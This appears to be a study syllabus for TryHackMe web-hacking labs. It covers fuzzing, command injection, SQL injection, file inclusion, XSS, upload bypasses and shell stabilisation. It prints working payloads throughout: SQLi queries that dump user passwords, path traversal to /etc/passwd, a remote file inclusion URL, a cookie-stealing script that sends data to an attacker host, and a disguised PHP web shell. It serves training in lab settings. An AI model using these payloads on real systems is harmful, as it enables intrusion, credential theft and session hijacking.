# 🌐 Web Hacking Mastery Syllabus

An educational repository tracking core web security concepts, defensive vulnerabilities, and tactical exploitation mechanics
---

## 🧭 1. Content Discovery & Fuzzing Mechanics
Educational Focus: Understanding how web applications handle unlinked resources and how data inputs are mapped.

### 🎯 THM Room Clues (When to use)
* The room asks you to find a hidden directory or a specific "flag.txt" hidden on the server.
* The web page is completely blank, or just a default "Apache2 It Works!" page.

### 🧩 Core Concepts
* **Predictive Brute Forcing**: Tools like `gobuster` send standard HTTP requests (like `GET` or `HEAD`) using a dictionary list and analyze the **HTTP Status Code** returned by the server.
* **Fuzzing**: Replacing a structural component of an HTTP request with a variable payload to observe variations in response size, words, or status codes.

### 🛠️ Tool Mechanics & Syntax
```bash
# Directory discovery checking for backups and configuration files
gobuster dir -u http://10.10.X.X/ -w /usr/share/wordlists/dirb/common.txt -x php,bak,config,log

# Parameter fuzzing: Identifying hidden query variables (?id=, ?page=, ?file=)
# --hc 404 filters out standard 'Not Found' responses to reveal valid parameters
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.X.X/index.php?FUZZ=test
```

---

## 💉 2. Command Injection
Educational Focus: Breaking out of intended application logic to execute OS commands.

### 🎯 THM Room Clues (When to use)
* The web application features a "Ping a Server", "Traceroute", or "Convert PDF/Image" utility field.
* The room description mentions interacting with the underlying Linux host OS via the web server.

### 🔬 The Vulnerability Anatomy
Command injection occurs when an application passes unsafe user input directly to a system shell (like `system()`, `exec()`, or `passthru()` in PHP) without auditing or sanitization.

### 🔓 Exploitation Blueprint
1. **Identify the Concatenation Character**: Test how the backend processes inputs by appending flags to break out of the string:
   * `;` (Linux: Run sequentially)
   * `&&` (Linux/Windows: Run if first succeeds)
   * `||` (Linux/Windows: Run if first fails)
   * `|` (Linux/Windows: Pipe output to input)
   * `%0A` (URL encoded newline character)
2. **Determine Connectivity (Out-of-Band)**: If the page does not echo command output back to the screen (Blind Command Injection), validate execution by forcing the target server to communicate with your AttackBox:
   ```bash
   # Input payload sent to target input field:
   ; ping -c 3 YOUR_ATTACKBOX_IP
   
   # Command run on your AttackBox to listen for incoming packets:
   sudo tcpdump -i tun0 icmp
   ```

### 🛡️ Secure Code Remediation
Avoid system calls entirely. Use built-in programming language APIs that pass arguments safely as an array (e.g., `subprocess.run(["ping", "-c", "3", user_input])` in Python) rather than invoking a raw shell interpreter.

---

## 🗄️ 3. SQL Injection (SQLi)
Educational Focus: Manipulating relational database queries to bypass authentication or map structural data.

### 🎯 THM Room Clues (When to use)
* The room features a search bar, a product catalog, or a login form.
* Inputting a single quote (`'`) causes a database error, an "Internal Server Error 500", or makes elements on the page vanish.

### 🔬 The Vulnerability Anatomy
Occurs when user inputs are dynamically concatenated into a database query string instead of using parameterized queries. This allows an attacker to inject syntax that alters the logic structure of the query.

### 🔓 Exploitation Blueprint (Union-Based)
`UNION` allows an attacker to append the results of an arbitrary query to the results of the original application query.

```sql
-- Step 1: Discover Column Count (Keep incrementing until the page errors or breaks)
' ORDER BY 1 -- -
' ORDER BY 5 -- -  <-- If this errors, the database contains fewer than 5 columns.

-- Step 2: Determine Data Types & Reflections (Look for where numbers 1, 2, or 3 print on screen)
' UNION SELECT 1, 2, 3 -- -

-- Step 3: Enumerate System Context
' UNION SELECT 1, database(), version() -- -

-- Step 4: Map Structural Schema (Extracting table names from the database directory)
' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() -- -

-- Step 5: Extract Target Records
' UNION SELECT 1, username, password FROM users -- -
```
*Note on syntax:* `-- -` is a sequence used to comment out the rest of the original SQL query, ignoring trailing code or syntax quotes.

---

## 📂 4. File Inclusion (LFI / RFI)
Educational Focus: Subverting file handling logic to leak sensitive configuration structures or achieve remote code execution.

### 🎯 THM Room Clues (When to use)
* The URL explicitly contains parameters like `?page=home.php`, `?file=about`, or `?view=main`.
* The room asks you to retrieve the contents of `/etc/passwd` or user flags hidden in home directories.

### 🔬 The Vulnerability Anatomy
* **LFI (Local File Inclusion)**: Happens when an application accepts local system file paths via user input (e.g., `include($_GET['page']);`) without validation, allowing users to read files outside the webroot.
* **RFI (Remote File Inclusion)**: Occurs when the web server's runtime settings allow external URLs to be pulled into a file inclusion statement, causing the server to download and execute code hosted on an attacker's machine.

### 🔓 Exploitation Blueprint
```http
# Standard Path Traversal (Escaping the webroot directory using relative paths)
http://10.10.X.X/nav.php?page=../../../../etc/passwd

# PHP Base64 Filter (Bypasses execution; allows reading raw PHP source code instead of processing it)
http://10.10.X.X/nav.php?page=php://filter/convert.base64-encode/resource=config.php

# Remote File Inclusion (Loading an external shell script into server memory)
http://10.10.X.X/nav.php?page=http://YOUR_ATTACKBOX_IP/shell.txt
```

---

## 📜 5. Cross-Site Scripting (XSS)
Educational Focus: Executing malicious scripts within the browser of a victim user by abusing trust.

### 🎯 THM Room Clues (When to use)
* The room asks you to "steal the Administrator's cookie" using a simulated victim bot that reviews your inputs.
* There is a guestbook, profile bio field, or comment box where input text is persistently displayed back to users.

### 🔬 The Vulnerability Anatomy
* **Reflected XSS**: The payload is embedded in a malicious URL link or request parameter, which the target application echoes back to the user without proper encoding.
* **Stored XSS**: The payload is saved directly into the application's persistent database and executes whenever *any* user loads the infected page.

### 🔓 Exploitation Blueprint (Cookie Exfiltration)
1. Inject a script designed to steal the current session tokens (`document.cookie`) and forward them to a machine under your control.
   ```html
   <script>fetch('http://YOUR_ATTACKBOX_IP:9001/?token=' + btoa(document.cookie));</script>
   ```
2. Spawn a local listener to capture the inbound exfiltration packet containing the session:
   ```bash
   nc -lvnp 9001
   ```
3. Copy the base64 string from your listener, decode it, and substitute your current browser session cookie with the victim's cookie to achieve **Session Hijacking**.

---

## 📤 6. File Upload Bypasses
Educational Focus: Defeating server-side validation filters to upload executable web shells.

### 🎯 THM Room Clues (When to use)
* The web page allows uploading an image, avatar, or document resume.
* The room goals require you to achieve Remote Code Execution (RCE) via an upload feature.

### 🔬 Validation Mechanisms & Bypasses
Web servers try to block scripts by checking three things. Intercept the upload request in **Burp Suite** to bypass them:

1. **Extension Whitelisting/Blacklisting Bypass**: If `.php` is blocked, try alternative executable extensions:
   * *Alternative PHP:* `.php5`, `.phtml`, `.phar`, `.pgif` [1]
   * *Double Extension:* `shell.jpg.php`
   * *Null Byte (Older servers):* `shell.php%00.jpg`
2. **MIME-Type Spoofing**: The server checks the `Content-Type` header sent by your browser.
   * Change: `Content-Type: application/x-php`
   * To: `Content-Type: image/jpeg` or `image/png`
3. **Magic Bytes Verification**: The server reads the first few bytes of the file to verify its true format. You can spoof this by adding valid image headers to the absolute top of your web shell script:
   * *GIF87a / GIF89a Magic Bytes:*
     ```php
     GIF89a;
     <?php system($_GET['cmd']); ?>
     ```

---

## 🐚 7. Reverse Shell & TTY Stabilization Mechanics
Educational Focus: Converting an unstable remote code execution access point into a reliable administrative interface.

### 🎯 THM Room Clues (When to use)
* You successfully exploited Command Injection, SQLi, File Inclusion, or File Uploads, and your Netcat listener caught a shell.

### 🔬 Why Stabilization Matters
A standard netcat reverse shell (`nc -lvnp 4444`) catches a basic input/output stream. It lacks basic keyboard shortcuts (`Ctrl+C` kills the connection, tab-completion doesn't work), and it will immediately crash if text formatting strings are returned.

### 🔓 The Stabilization Blueprint
Once your terminal catches an active connection, execute these steps precisely:

1. **Invoke Python PTY**: Forces the target operating system to spawn a pseudo-terminal (PTY) interface.
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
